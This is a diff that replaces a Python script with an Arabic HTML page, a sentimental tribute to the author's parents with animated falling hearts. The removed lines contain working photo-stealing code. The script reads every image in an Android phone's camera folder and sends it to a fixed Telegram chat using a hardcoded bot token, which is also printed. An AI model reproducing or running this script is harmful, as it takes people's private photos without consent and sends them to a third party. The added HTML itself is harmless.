@@ -1,19 +1,150 @@
-import os
-import telebot
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أغلى ما ليا</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a1a, #2c001e);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+            text-align: center;
+            position: relative;
+        }
+        /* الشاشة الأولى */
+        #welcome-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            z-index: 10;
+        }
+        h1 {
+            font-size: 2.5rem;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+            animation: fadeIn 2s ease-in-out;
+        }
+        .start-btn {
+            padding: 12px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #fff;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 75, 43, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .start-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(255, 75, 43, 0.6);
+        }
+        /* الشاشة الثانية (مخفية في البداية) */
+        #content-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 25px;
+            max-width: 90%;
+            animation: zoomIn 1.2s ease-in-out forwards;
+            z-index: 10;
+        }
+        .img-container {
+            border: 4px solid #fff;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.6);
+            max-width: 500px;
+            width: 100%;
+        }
+        .img-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        h2 {
+            font-size: 2.2rem;
+            color: #ff4b2b;
+            text-shadow: 0 0 8px rgba(255, 75, 43, 0.3);
+        }
+        /* تأثير القلوب المتساقطة */
+        .heart {
+            position: absolute;
+            color: #ff416c;
+            font-size: 20px;
+            animation: fall linear infinite;
+            top: -10%;
+            opacity: 0.7;
+            user-select: none;
+            pointer-events: none;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(110vh) rotate(360deg);
+            }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes zoomIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
 
-bot = telebot.TeleBot("8669214037:AAHBBzBfaMgCMnrMKd-KcDiFKmXI9BfgDOQ")
+    <!-- الشاشة الأولى -->
+    <div id="welcome-screen">
+        <h1>أمى و أبى اغلى ما ليا ❤️</h1>
+        <button class="start-btn" onclick="showContent()">Start</button>
+    </div>
 
-dir_path = "/storage/emulated/0/DCIM/Camera/"
+    <!-- الشاشة الثانية -->
+    <div id="content-screen">
+        <div class="img-container">
+            <!-- تم وضع اسم صورتك هنا مباشرة لتظهر فوراً -->
+            <img src="1000093292.jpg" alt="العائلة الغالية">
+        </div>
+        <h2>ربنا يخليكم ليا ❤️</h2>
+    </div>
 
-for file_name in os.listdir(dir_path):
-    file_path = os.path.join(dir_path, file_name)
+    <script>
+        function showContent() {
+            // إخفاء الشاشة الأولى وإظهار الثانية
+            document.getElementById('welcome-screen').style.display = 'none';
+            document.getElementById('content-screen').style.display = 'flex';
+            
+            // تشغيل تأثير القلوب المتساقطة العاطفي بالخلفية
+            setInterval(createHeart, 300);
+        }
 
-    if file_name.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
-        try:
-            with open(file_path, "rb") as f:
-                bot.send_photo(chat_id="6287438473", photo=f)
-                print(f"✔️ تم إرسال: {file_name}")
-        except Exception as e:
-            print(f"❌ خطأ أثناء إرسال {file_name}: {e}")
-    else:
-        print(f"تخطي الملف: {file_name}")
+        function createHeart() {
+            const heart = document.createElement('div');
+            heart.classList.add('heart');
+            heart.innerHTML = '❤️';
+            heart.style.left = Math.random() * 100 + 'vw';
+            heart.style.animationDuration = Math.random() * 3 + 2 + 's';
+            heart.style.fontSize = Math.random() * 15 + 15 + 'px';
+            document.body.appendChild(heart);
+
+            setTimeout(() => {
+                heart.remove();
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
